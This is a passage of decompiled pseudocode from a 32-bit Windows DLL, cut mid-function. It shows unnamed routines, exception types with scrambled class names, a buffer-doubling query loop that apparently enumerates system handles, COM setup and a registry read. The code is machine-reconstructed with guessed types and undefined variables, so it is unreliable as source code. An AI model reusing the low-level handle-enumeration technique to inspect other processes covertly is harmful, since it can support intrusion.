    LOBYTE(v24) = 0;
    dword_100BC724 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_1002481B(v13, v14, (int)v15);
    v24 = -1;
  }
  v22 = 0;
  sub_10016983(0, (int)v18, 0);
  v24 = 3;
  v2 = dword_100BC724(0, 3, 0, 0, &v22);
  if ( v2 != -1073741820 )
    goto LABEL_6;
  v3 = (int *)sub_10016983(v22, (int)v17, 0);
  LOBYTE(v24) = 4;
  sub_10016B2F(v3, (int)v18);
  LOBYTE(v24) = 3;
  sub_10016B53(v17);
  v16 = (_ThrowInfo *)&v22;
  v15 = v19;
  v4 = sub_10016C00(v18);
  if ( dword_100BC724(0, 3, v4, v15, v16) < 0 )
  {
    v16 = (_ThrowInfo *)&v22;
    v15 = v19;
    v5 = sub_10016C00(v18);
    v2 = dword_100BC724(0, 3, v5, v15, v16);
LABEL_6:
    sub_1002EA34(pExceptionObject, v2);
    v16 = (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__;
    v6 = (int **)pExceptionObject;
    goto LABEL_7;
  }
  *(_BYTE *)(v18[1] + 8) = 1;
  v7 = (_DWORD *)sub_10016C24(v18);
  if ( *v7 > 0xFFu )
  {
    sub_10016441(&v21);
    v16 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
LABEL_10:
    v6 = &v21;
LABEL_7:
    _CxxThrowException(v6, v16);
  }
  v8 = 0;
  v9 = v7 + 1;
  if ( !*v7 )
    goto LABEL_16;
  while ( 1 )
  {
    v10 = sub_1000CC20(pExceptionObject, (wchar_t *)v9[1]);
    LOBYTE(v24) = 5;
    v23 = sub_1000D84E((int)&unk_100BF7F4, (int)v10);
    LOBYTE(v24) = 3;
    sub_1000CE59(pExceptionObject);
    if ( v23 )
      break;
    v9 = (_DWORD *)((char *)v9 + (-(*((unsigned __int16 *)v9 + 1) + 96) & 3) + *((unsigned __int16 *)v9 + 1) + 96);
    if ( (unsigned int)(unsigned __int8)++v8 >= *v7 )
      goto LABEL_16;
  }
  v11 = v8 + 1;
  if ( !v11 )
  {
LABEL_16:
    sub_10012DD3(&v21);
    v16 = (_ThrowInfo *)&_TI2_AVMxpteqpIoxoylsrdYuvyamxpt_sr__;
    goto LABEL_10;
  }
  v24 = -1;
  sub_10016B53(v18);
  return v11;
}
// 1003AB5D: variable 'v1' is possibly undefined
// 100BC724: using guessed type int (__stdcall *dword_100BC724)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100BF9B8: using guessed type int dword_100BF9B8;
// 1003AB27: using guessed type void *var_14;
// 1003AB27: using guessed type int var_48[5];

//----- (1003ACD6) --------------------------------------------------------
_DWORD *__cdecl sub_1003ACD6(_DWORD *a1)
{
  int v1; // edi
  int v2; // ecx
  int v3; // ecx
  int *v4; // eax
  int v5; // eax
  int v6; // eax
  int v8; // [esp-10h] [ebp-64h] BYREF
  int v9; // [esp-Ch] [ebp-60h]
  int v10; // [esp-8h] [ebp-5Ch] BYREF
  int v11; // [esp-4h] [ebp-58h]
  int v12[5]; // [esp+14h] [ebp-40h] BYREF
  int v13[6]; // [esp+28h] [ebp-2Ch] BYREF
  int v14; // [esp+40h] [ebp-14h]
  int pExceptionObject[3]; // [esp+44h] [ebp-10h] BYREF
  int v16; // [esp+50h] [ebp-4h]

  v14 = 0;
  v1 = 1024;
  sub_10016983((void *)0x400, (int)v13, 0);
  v16 = 1;
  v11 = v2;
  v10 = v2;
  pExceptionObject[0] = (int)&v10;
  sub_1000CE26(&v10, (int)&unk_100BF950);
  LOBYTE(v16) = 2;
  v9 = v3;
  v8 = v3;
  v13[5] = (int)&v8;
  sub_1000CE26(&v8, (int)&unk_100BF940);
  LOBYTE(v16) = 1;
  pExceptionObject[0] = (int)sub_1002481B(v8, v9, v10);
  while ( 1 )
  {
    v11 = 0;
    v10 = v13[3];
    v5 = sub_10016C00(v13);
    v6 = ((int (__stdcall *)(int, int, int, int))pExceptionObject[0])(16, v5, v10, v11);
    if ( !v6 )
      break;
    if ( v6 != -1073741820 )
    {
      sub_10016441(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    v1 *= 2;
    v4 = (int *)sub_10016983((void *)v1, (int)v12, 0);
    LOBYTE(v16) = 4;
    sub_10016B2F(v4, (int)v13);
    LOBYTE(v16) = 1;
    sub_10016B53(v12);
  }
  sub_1003ADF0(v13, a1);
  v14 = 1;
  LOBYTE(v16) = 0;
  sub_10016B53(v13);
  return a1;
}
// 1003ACFF: variable 'v2' is possibly undefined
// 1003AD15: variable 'v3' is possibly undefined
// 1003ACD6: using guessed type int var_40[5];

//----- (1003ADC0) --------------------------------------------------------
int __stdcall sub_1003ADC0(int a1)
{
  sub_10016983(0, a1, 0);
  *(_DWORD *)(a1 + 20) = 0;
  *(_DWORD *)(a1 + 24) = 0;
  return a1;
}

//----- (1003ADF0) --------------------------------------------------------
_DWORD *__userpurge sub_1003ADF0@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // eax

  sub_10016AE9(a1, (int)a2);
  v2 = *(_DWORD *)sub_10016C24(a2);
  a2[6] = 0;
  a2[5] = v2;
  return a2;
}

//----- (1003AE32) --------------------------------------------------------
int __userpurge sub_1003AE32@<eax>(_DWORD *a1@<esi>, int a2)
{
  int v2; // eax
  int v3; // edx
  int v4; // eax
  int result; // eax
  _DWORD pExceptionObject[3]; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v7 = 0;
  if ( a1[5] <= a1[6] )
  {
    sub_1001668F(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v2 = sub_10016C24(a1);
  v4 = 16 * v3 + v2;
  result = sub_1003A7CD(
             a2,
             *(unsigned __int16 *)(v4 + 10),
             *(_DWORD *)(v4 + 4),
             *(_BYTE *)(v4 + 9),
             *(_DWORD *)(v4 + 12),
             *(_DWORD *)(v4 + 16),
             *(_BYTE *)(v4 + 8));
  v7 = 0;
  ++a1[6];
  return result;
}
// 1003AE6C: variable 'v3' is possibly undefined
// 1003AE32: using guessed type _DWORD pExceptionObject[3];

//----- (1003AEA6) --------------------------------------------------------
int __stdcall sub_1003AEA6(int a1, int a2, int a3, int a4, int a5, int a6, int a7, char a8)
{
  *(_DWORD *)a1 = &off_10095184;
  *(_DWORD *)a1 = &off_10095160;
  sub_1000CE26((_DWORD *)(a1 + 4), (int)&a2);
  sub_1000CE26((_DWORD *)(a1 + 12), (int)&a4);
  *(_DWORD *)(a1 + 20) = a6;
  *(_DWORD *)(a1 + 24) = a7;
  *(_BYTE *)(a1 + 28) = a8;
  sub_1000CE59(&a2);
  sub_1000CE59(&a4);
  return a1;
}
// 10095160: using guessed type int (__thiscall *off_10095160)(void *Block, char);
// 10095184: using guessed type int (__thiscall *off_10095184)(void *Block, char);

//----- (1003AF22) --------------------------------------------------------
int *__thiscall sub_1003AF22(int *Block, char a2)
{
  sub_1003AF41(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003AF41) --------------------------------------------------------
LONG __thiscall sub_1003AF41(int *this)
{
  LONG result; // eax

  *this = (int)&off_10095160;
  sub_1000CE59(this + 3);
  result = sub_1000CE59(this + 1);
  *this = (int)&off_10095184;
  return result;
}
// 10095160: using guessed type int (__thiscall *off_10095160)(void *Block, char);
// 10095184: using guessed type int (__thiscall *off_10095184)(void *Block, char);

//----- (1003AF83) --------------------------------------------------------
_DWORD *__thiscall sub_1003AF83(void *this, _DWORD *a2)
{
  sub_1000CE26(a2, (int)this + 12);
  return a2;
}

//----- (1003AFB5) --------------------------------------------------------
_DWORD *__thiscall sub_1003AFB5(void *this, _DWORD *a2)
{
  sub_1000CE26(a2, (int)this + 4);
  return a2;
}

//----- (1003AFE7) --------------------------------------------------------
int __thiscall sub_1003AFE7(_DWORD *this)
{
  return this[5];
}

//----- (1003AFEB) --------------------------------------------------------
int __thiscall sub_1003AFEB(_DWORD *this)
{
  return this[6];
}

//----- (1003AFEF) --------------------------------------------------------
char __thiscall sub_1003AFEF(_BYTE *this)
{
  return this[28];
}

//----- (1003AFFA) --------------------------------------------------------
_DWORD *__thiscall sub_1003AFFA(_DWORD *Block, char a2)
{
  *Block = &off_10095184;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10095184: using guessed type int (__thiscall *off_10095184)(void *Block, char);

//----- (1003B021) --------------------------------------------------------
_DWORD *__stdcall sub_1003B021(_DWORD *a1)
{
  sub_1001DB62((int)a1);
  *a1 = &off_100951A8;
  return a1;
}
// 100951A8: using guessed type int (__thiscall *off_100951A8)(void *Block, char);

//----- (1003B054) --------------------------------------------------------
HANDLE sub_1003B054()
{
  return CreateEventA(0, 1, 0, 0);
}

//----- (1003B062) --------------------------------------------------------
int __thiscall sub_1003B062(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 80))(this);
}

//----- (1003B067) --------------------------------------------------------
int *__thiscall sub_1003B067(int *Block, char a2)
{
  sub_1003B084(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003B084) --------------------------------------------------------
LONG __stdcall sub_1003B084(int *a1)
{
  return sub_1001DEAB(a1);
}

//----- (1003B0BA) --------------------------------------------------------
_DWORD *__stdcall sub_1003B0BA(_DWORD *a1, int a2)
{
  sub_1003B021(a1);
  *a1 = &off_10095200;
  a1[27] = a2;
  sub_1003B2CE(a1 + 28);
  return a1;
}
// 10095200: using guessed type int (__thiscall *off_10095200)(void *Block, char);

//----- (1003B0FD) --------------------------------------------------------
int *__thiscall sub_1003B0FD(int *Block, char a2)
{
  sub_1003B119(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003B119) --------------------------------------------------------
LONG __thiscall sub_1003B119(int *this)
{
  *this = (int)&off_10095200;
  sub_1003B30E(this + 28);
  return sub_1003B084(this);
}
// 10095200: using guessed type int (__thiscall *off_10095200)(void *Block, char);

//----- (1003B154) --------------------------------------------------------
int __thiscall sub_1003B154(int this)
{
  int v2; // eax
  void *v3; // eax
  int v4; // eax
  char v5; // al
  int v7; // [esp+0h] [ebp-38h] BYREF
  void *v8[5]; // [esp+Ch] [ebp-2Ch] BYREF
  int v9[3]; // [esp+20h] [ebp-18h] BYREF
  int v10; // [esp+34h] [ebp-4h]

  v9[2] = (int)&v7;
  v9[1] = this;
  v9[0] = (int)&off_10094EC8;
  v2 = CoInitializeEx(0, 0);
  if ( v2 < 0 )
    sub_10032C53(v2);
  v10 = 1;
  v3 = operator new(0x4Cu);
  v8[4] = v3;
  LOBYTE(v10) = 2;
  if ( v3 )
    v4 = sub_1003B3E2((int)v3, *(_ThrowInfo **)(this + 108));
  else
    v4 = 0;
  LOBYTE(v10) = 1;
  sub_1003B35A((_DWORD *)(this + 112), v4);
  sub_1003B28D(this);
  sub_10041E63(v8);
  LOBYTE(v10) = 3;
  v5 = (unsigned __int8)sub_1003B054();
  sub_10042103(v8, v5);
  while ( sub_1003B27E(this) )
  {
    LOBYTE(v10) = 4;
    if ( sub_10041EEA((int)v8, *(_DWORD *)(this + 100)) == -1 )
      sub_1003B5E7(*(_DWORD *)(this + 112));
    v10 = 3;
  }
  sub_1003B276(this);
  LOBYTE(v10) = 1;
  sub_10041E8A((int)v8);
  v10 = -1;
  sub_10032C92(v9);
  return 0;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10094EC8: using guessed type int (__thiscall *off_10094EC8)(void *Block, char);

//----- (1003B276) --------------------------------------------------------
int __usercall sub_1003B276@<eax>(int a1@<eax>)
{
  return sub_1003B9E0(*(_DWORD **)(a1 + 112));
}

//----- (1003B27E) --------------------------------------------------------
BOOL __usercall sub_1003B27E@<eax>(int a1@<eax>)
{
  return (*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 108) + 36))(*(_DWORD *)(a1 + 108)) != 0;
}

//----- (1003B28D) --------------------------------------------------------
int __usercall sub_1003B28D@<eax>(int a1@<esi>)
{
  __int16 v1; // cx
  int result; // eax
  int v3[2]; // [esp+0h] [ebp-10h] BYREF
  __int16 v4; // [esp+8h] [ebp-8h]
  __int16 v5; // [esp+Ah] [ebp-6h]
  __int16 v6; // [esp+Ch] [ebp-4h]

  (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(a1 + 108) + 32))(*(_DWORD *)(a1 + 108), v3);
  v1 = v4;
  *(_DWORD *)(a1 + 100) = v3[0];
  *(_DWORD *)(a1 + 104) = v3[1];
  *(_WORD *)(*(_DWORD *)(a1 + 112) + 56) = v1;
  *(_WORD *)(*(_DWORD *)(a1 + 112) + 58) = v5;
  result = *(_DWORD *)(a1 + 112);
  *(_WORD *)(result + 60) = v6;
  return result;
}

//----- (1003B2CE) --------------------------------------------------------
_DWORD *__usercall sub_1003B2CE@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003B30E) --------------------------------------------------------
void __thiscall sub_1003B30E(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1003B3A4((int)this);
}

//----- (1003B35A) --------------------------------------------------------
_DWORD *__usercall sub_1003B35A@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *result; // eax

  result = &loc_10075735;
  if ( *a1 != a2 )
  {
    sub_1003B3A4((int)a1);
    result = operator new(4u);
    if ( result )
      *result = 1;
    else
      result = 0;
    a1[1] = result;
    *a1 = a2;
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003B3A4) --------------------------------------------------------
void __usercall sub_1003B3A4(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1003B3E2) --------------------------------------------------------
int __stdcall sub_1003B3E2(int a1, _ThrowInfo *a2)
{
  void *v2; // ecx
  _DWORD *v3; // eax
  int (__thiscall **v4)(_DWORD); // esi
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int v8; // [esp-10h] [ebp-50h]
  int v9; // [esp-Ch] [ebp-4Ch]
  _ThrowInfo *v10; // [esp-4h] [ebp-44h] BYREF
  int v11; // [esp+0h] [ebp-40h] BYREF
  _DWORD v12[3]; // [esp+Ch] [ebp-34h] BYREF
  void *v13[3]; // [esp+18h] [ebp-28h] BYREF
  void *Block; // [esp+28h] [ebp-18h]
  _DWORD pExceptionObject[2]; // [esp+2Ch] [ebp-14h] BYREF
  int v16; // [esp+3Ch] [ebp-4h]

  pExceptionObject[1] = &v11;
  *(_DWORD *)a1 = off_100952EC;
  sub_1003FA98((_DWORD *)(a1 + 4));
  v16 = 0;
  sub_1003FD30((_DWORD *)(a1 + 40));
  LOBYTE(v16) = 1;
  *(_WORD *)(a1 + 56) = 20;
  *(_WORD *)(a1 + 58) = 10;
  *(_WORD *)(a1 + 60) = 5;
  *(_DWORD *)(a1 + 64) = a2;
  sub_1004023F((_DWORD *)(a1 + 68), 0);
  LOBYTE(v16) = 2;
  if ( !sub_1003BA03((_DWORD **)a1) )
  {
    sub_10016441(pExceptionObject);
    v10 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    v3 = pExceptionObject;
    goto LABEL_3;
  }
  a2 = 0;
  LOBYTE(v16) = 4;
  sub_1003CEFE(v2, &a2);
  if ( !a2 )
  {
    sub_100167F9(v12, 1);
    v10 = (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__;
    v3 = v12;
LABEL_3:
    _CxxThrowException(v3, v10);
  }
  Block = operator new(0x10u);
  LOBYTE(v16) = 5;
  if ( Block )
  {
    v13[2] = &v10;
    v10 = a2;
    if ( a2 )
      (*(void (__cdecl **)(_ThrowInfo *, _ThrowInfo *))(a2->attributes + 4))(a2, v10);
    LOBYTE(v16) = 6;
    v4 = (int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 64) + 20);
    v9 = sub_1000E8F9((int)&unk_100B663C);
    v8 = (*v4)(*(_DWORD *)(a1 + 64));
    LOBYTE(v16) = 5;
    v5 = sub_10045BD0(Block, v8, v9);
  }
  else
  {
    v5 = 0;
  }
  LOBYTE(v16) = 4;
  v6 = sub_1004023F(v13, (int)v5);
  LOBYTE(v16) = 7;
  sub_100402BC((_DWORD *)(a1 + 68), v6);
  LOBYTE(v16) = 4;
  sub_10040283(v13);
  LOBYTE(v16) = 3;
  if ( a2 )
    (*(void (__cdecl **)(_ThrowInfo *))(a2->attributes + 8))(a2);
  return a1;
}
// 1003B46D: variable 'v2' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100952EC: using guessed type int (__thiscall *off_100952EC[2])(void *Block, char);
// 1003B3E2: using guessed type _DWORD var_34[3];

//----- (1003B54D) --------------------------------------------------------
_DWORD *__thiscall sub_1003B54D(_DWORD *Block, char a2)
{
  sub_1003B569(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003B569) --------------------------------------------------------
void *__thiscall sub_1003B569(_DWORD *this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *this = off_100952EC;
  v4 = 3;
  (*(void (**)(void))(this[1] + 4))();
  sub_1003B9E0(this);
  v4 = 1;
  sub_10040283(this + 17);
  LOBYTE(v4) = 0;
  sub_1003FDB6(this + 10);
  v4 = -1;
  return sub_1003FAE1(this + 1);
}
// 100952EC: using guessed type int (__thiscall *off_100952EC[2])(void *Block, char);

//----- (1003B5E7) --------------------------------------------------------
void *__stdcall sub_1003B5E7(int a1)
{
  int v1; // eax
  _DWORD *v2; // eax
  int *v3; // ecx
  int *v5; // [esp-14h] [ebp-6Ch] BYREF
  int *v6; // [esp-10h] [ebp-68h]
  int v7; // [esp+0h] [ebp-58h] BYREF
  _DWORD v8[4]; // [esp+Ch] [ebp-4Ch] BYREF
  _DWORD v9[4]; // [esp+1Ch] [ebp-3Ch] BYREF
  int v10[6]; // [esp+2Ch] [ebp-2Ch] BYREF
  unsigned int i; // [esp+44h] [ebp-14h]
  int *v12; // [esp+48h] [ebp-10h]
  int v13; // [esp+54h] [ebp-4h]

  v12 = &v7;
  v13 = 0;
  sub_10040308(v8);
  LOBYTE(v13) = 1;
  sub_1004085B(v10);
  v10[5] = 0;
  LOBYTE(v13) = 3;
  sub_1003B954((_DWORD *)a1);
  v1 = (*(int (__thiscall **)(_DWORD, _DWORD *))(**(_DWORD **)(a1 + 68) + 4))(*(_DWORD *)(a1 + 68), v9);
  LOBYTE(v13) = 4;
  (*(void (__thiscall **)(int *, int))(v10[0] + 56))(v10, v1);
  LOBYTE(v13) = 3;
  sub_100408DA(v9);
  for ( i = 0; i < v10[1]; ++i )
  {
    v2 = (_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v10[0] + 44))(v10, i);
    v6 = v3;
    v5 = v3;
    v10[4] = (int)&v5;
    sub_1004080B(v2, &v5);
    LOBYTE(v13) = 3;
    sub_1003B6DC(a1, v5, (int)v6);
  }
  sub_1003B87D(a1);
  LOBYTE(v13) = 1;
  sub_100408DA(v10);
  LOBYTE(v13) = 0;
  return sub_10040382(v8);
}
// 1003B665: variable 'v3' is possibly undefined
// 1003B5E7: using guessed type _DWORD var_4C[4];
// 1003B5E7: using guessed type _DWORD var_3C[4];

//----- (1003B6DC) --------------------------------------------------------
void __stdcall sub_1003B6DC(int a1, int *a2, int a3)
{
  int *v3; // edi
  int v4; // ebx
  int *v5; // esi
  bool v6; // zf
  int v7; // eax
  int *v8; // eax
  int v9; // ebx
  int v10; // ecx
  int v11; // eax
  int v12; // eax
  int *v13; // eax
  int *v14; // [esp-18h] [ebp-4Ch]
  _DWORD *v15; // [esp-14h] [ebp-48h]
  _DWORD v16[4]; // [esp-10h] [ebp-44h] BYREF
  int v17; // [esp+0h] [ebp-34h] BYREF
  _DWORD v18[2]; // [esp+Ch] [ebp-28h] BYREF
  char v19; // [esp+14h] [ebp-20h]
  int v20[2]; // [esp+18h] [ebp-1Ch] BYREF
  int v21[2]; // [esp+20h] [ebp-14h] BYREF
  int v22; // [esp+30h] [ebp-4h]

  v21[1] = (int)&v17;
  v22 = 0;
  v3 = a2;
  v21[0] = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
  v4 = a1;
  v5 = (int *)(a1 + 4);
  v6 = (*(unsigned __int8 (__thiscall **)(int, int *))(*(_DWORD *)(a1 + 4) + 8))(a1 + 4, v21) == 0;
  v7 = *(_DWORD *)(a1 + 4);
  if ( v6 )
  {
    if ( (*(int (__thiscall **)(int *))(v7 + 4))(v5) < (unsigned int)*(unsigned __int16 *)(a1 + 58) )
    {
      sub_100099CF((int)v18, 1);
      LOBYTE(v22) = 1;
      v8 = sub_1003BC84((unsigned int *)a1, v20);
      LOBYTE(v22) = 2;
      sub_1003F10C(v18, v8);
      LOBYTE(v22) = 1;
      sub_1000AC0D(v20);
      v9 = (*(int (__thiscall **)(int *, int *))(*v5 + 16))(v5, v21);
      sub_1003F10C((_DWORD *)v9, v18);
      *(_BYTE *)(v9 + 8) = v19;
      LOBYTE(v22) = 0;
      sub_1000A9D3(v18);
      v3 = a2;
      v4 = a1;
LABEL_5:
      LOBYTE(v22) = 3;
      v11 = *v3;
      v16[1] = v10;
      v16[0] = v10;
      v20[1] = (int)v16;
      v15 = v16;
      (*(void (__thiscall **)(int *))(v11 + 8))(v3);
      LOBYTE(v22) = 4;
      v12 = *v5;
      v14 = v21;
      v13 = *(int **)(*(int (__thiscall **)(int *))(v12 + 16))(v5);
      LOBYTE(v22) = 3;
      sub_10043379(v13, (int)v21, (int)v16);
      v22 = 0;
      *(_BYTE *)((*(int (__thiscall **)(int, int *))(*(_DWORD *)(v4 + 4) + 16))(v4 + 4, v21) + 8) = 1;
    }
  }
  else if ( !*(_BYTE *)((*(int (__thiscall **)(int *, int *))(v7 + 16))(v5, v21) + 8) )
  {
    goto LABEL_5;
  }
  v22 = -1;
  sub_1004081F(&a2);
}
// 1003B7A2: variable 'v10' is possibly undefined
// 1003B6DC: using guessed type _DWORD var_28[2];

//----- (1003B87D) --------------------------------------------------------
void *__usercall sub_1003B87D@<eax>(int a1@<edi>)
{
  int v1; // esi
  int v2; // eax
  int v3; // eax
  volatile LONG *v4; // edx
  int *v5; // ecx
  int *v6; // eax
  int *v8; // [esp-4h] [ebp-40h] BYREF
  volatile LONG *v9; // [esp+0h] [ebp-3Ch]
  int v10; // [esp+10h] [ebp-2Ch] BYREF
  unsigned int i; // [esp+14h] [ebp-28h]
  int **v12; // [esp+18h] [ebp-24h]
  int v13; // [esp+1Ch] [ebp-20h] BYREF
  unsigned int v14; // [esp+20h] [ebp-1Ch]
  int v15; // [esp+38h] [ebp-4h]

  v1 = a1 + 4;
  v2 = *(_DWORD *)(a1 + 4);
  v10 = 0;
  (*(void (__thiscall **)(int, int *))(v2 + 44))(a1 + 4, &v13);
  v15 = 0;
  for ( i = 0; i < v14; ++i )
  {
    v10 = *(_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v13 + 44))(&v13, i);
    if ( !*(_BYTE *)((*(int (__thiscall **)(int, int *))(*(_DWORD *)v1 + 16))(a1 + 4, &v10) + 8) )
    {
      v3 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)v1 + 16))(a1 + 4, &v10);
      v4 = *(volatile LONG **)(v3 + 4);
      v8 = v5;
      v9 = v4;
      v6 = *(int **)v3;
      v12 = &v8;
      v8 = v6;
      InterlockedIncrement(v4);
      LOBYTE(v15) = 0;
      sub_1003BD98(a1, v8, (int)v9);
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)v1 + 12))(a1 + 4, &v10);
    }
  }
  v15 = -1;
  return sub_1003F17B((int)&v13);
}
// 1003B8F6: variable 'v5' is possibly undefined

//----- (1003B954) --------------------------------------------------------
void *__thiscall sub_1003B954(_DWORD *this)
{
  _DWORD *v1; // edi
  int v2; // eax
  int (__thiscall **v3)(_DWORD *, int); // esi
  int v4; // eax
  int v6; // [esp+Ch] [ebp-24h]
  int v7; // [esp+10h] [ebp-20h] BYREF
  unsigned int v8; // [esp+14h] [ebp-1Ch]
  int v9; // [esp+2Ch] [ebp-4h]

  v1 = this + 1;
  (*(void (__thiscall **)(_DWORD *, int *))(this[1] + 44))(this + 1, &v7);
  v9 = 0;
  v6 = 0;
  if ( v8 )
  {
    v2 = 0;
    do
    {
      v3 = (int (__thiscall **)(_DWORD *, int))(*v1 + 16);
      v4 = (*(int (__thiscall **)(int *, int))(v7 + 44))(&v7, v2);
      ++v6;
      *(_BYTE *)((*v3)(v1, v4) + 8) = 0;
      v2 = (unsigned __int16)v6;
    }
    while ( (unsigned __int16)v6 < v8 );
  }
  v9 = -1;
  return sub_1003F17B((int)&v7);
}

//----- (1003B9E0) --------------------------------------------------------
int __usercall sub_1003B9E0@<eax>(_DWORD *a1@<eax>)
{
  sub_1003B954(a1);
  sub_1003B87D((int)a1);
  return (*(int (__thiscall **)(_DWORD *))(a1[10] + 52))(a1 + 10);
}

//----- (1003BA03) --------------------------------------------------------
bool __thiscall sub_1003BA03(_DWORD **this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _ThrowInfo *v4; // ecx
  int *p_pExceptionObject; // eax
  _DWORD *v6; // eax
  int v7; // esi
  _DWORD *v9; // eax
  unsigned int v10; // esi
  bool v11; // bl
  _ThrowInfo *v12; // [esp-10h] [ebp-84h] BYREF
  _ThrowInfo *v13; // [esp-Ch] [ebp-80h]
  int v14; // [esp+0h] [ebp-74h] BYREF
  int v15[5]; // [esp+Ch] [ebp-68h] BYREF
  int v16[3]; // [esp+20h] [ebp-54h] BYREF
  int v17[2]; // [esp+2Ch] [ebp-48h] BYREF
  int v18[2]; // [esp+34h] [ebp-40h] BYREF
  _DWORD v19[2]; // [esp+3Ch] [ebp-38h] BYREF
  int v20[2]; // [esp+44h] [ebp-30h] BYREF
  int v21; // [esp+4Ch] [ebp-28h] BYREF
  void *Block; // [esp+50h] [ebp-24h]
  int v23; // [esp+54h] [ebp-20h] BYREF
  int v24; // [esp+58h] [ebp-1Ch] BYREF
  int pExceptionObject; // [esp+5Ch] [ebp-18h] BYREF
  char v26; // [esp+63h] [ebp-11h] BYREF
  int *v27; // [esp+64h] [ebp-10h]
  int v28; // [esp+70h] [ebp-4h]

  v27 = &v14;
  v28 = 0;
  (*(void (__thiscall **)(_DWORD *, int *))(*this[16] + 24))(this[16], v17);
  LOBYTE(v28) = 1;
  (*(void (__thiscall **)(_DWORD *, int *))(*this[16] + 28))(this[16], v18);
  LOBYTE(v28) = 2;
  sub_10008671((int)&v26);
  v2 = operator new(8u);
  Block = v2;
  LOBYTE(v28) = 3;
  if ( v2 )
    v3 = sub_1002F607((void *)0x20019, v2);
  else
    v3 = 0;
  LOBYTE(v28) = 2;
  sub_1001D1C0(v19, (int)v3);
  LOBYTE(v28) = 4;
  v13 = v4;
  v12 = v4;
  Block = &v12;
  sub_100402E4(v19, &v12);
  LOBYTE(v28) = 4;
  sub_1001D134((_DWORD *)dword_100BBCF8, (int)v12, (int)v13);
  v13 = (_ThrowInfo *)&unk_100BF9A0;
  if ( !(unsigned __int8)sub_1001D0A7((_DWORD *)dword_100BBCF8) )
  {
    sub_10016441(&pExceptionObject);
    v12 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_6;
  }
  sub_1001D076(v16, (int)&unk_100BF9A0);
  LOBYTE(v28) = 6;
  if ( !sub_10030A7E((int)v16, (int)&unk_100BF998) )
  {
    sub_10016441(&v24);
    v12 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v24;
    goto LABEL_6;
  }
  sub_10030ACF((int)v16, v15, (int)&unk_100BF998);
  LOBYTE(v28) = 7;
  if ( sub_1003504E(v15) != 1 )
  {
    sub_10016441(&v23);
    v12 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v23;
LABEL_6:
    _CxxThrowException(p_pExceptionObject, v12);
  }
  v6 = sub_10034CBF(v15, &v21);
  LOBYTE(v28) = 8;
  sub_10012A7C(v20, (int)v6);
  LOBYTE(v28) = 10;
  sub_1000CE59(&v21);
  sub_1000CC20(&v21, asc_100B6660);
  LOBYTE(v28) = 11;
  v7 = sub_1000D8AA((int)&v21, (int)v20, 0);
  LOBYTE(v28) = 10;
  sub_1000CE59(&v21);
  if ( v7 == -1 )
  {
    LOBYTE(v28) = 7;
    sub_10012AAC(v20);
    LOBYTE(v28) = 6;
    sub_10034AAA(v15);
    LOBYTE(v28) = 4;
    sub_1003078F(v16);
    LOBYTE(v28) = 2;
    sub_1001D1FF(v19);
    LOBYTE(v28) = 1;
    sub_1000CE59(v18);
    LOBYTE(v28) = 0;
    sub_1000CE59(v17);
    return 0;
  }
  else
  {
    v9 = sub_1000D2DE((int)v20, 0, &v21, v7);
    LOBYTE(v28) = 12;
    v10 = sub_10051B99(*(wchar_t **)(v9[1] + 12));
    LOBYTE(v28) = 10;
    sub_1000CE59(&v21);
